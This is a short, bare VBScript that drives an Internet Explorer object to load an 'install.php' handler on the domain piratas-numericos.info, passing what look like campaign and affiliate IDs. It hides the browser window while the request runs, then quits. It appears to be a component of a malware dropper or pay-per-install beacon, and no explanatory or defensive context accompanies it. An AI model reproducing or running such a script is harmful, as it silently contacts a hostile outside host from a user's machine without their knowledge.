set ie = WScript.CreateObject("InternetExplorer.Application")
ie.Visible=true
ie.Navigate("http://piratas-numericos.info/handlers/install.php?mid=2&aid=46")
ie.Visible=false
while (ie.Busy)
     WScript.Sleep(2000)
wend
ie.Quit()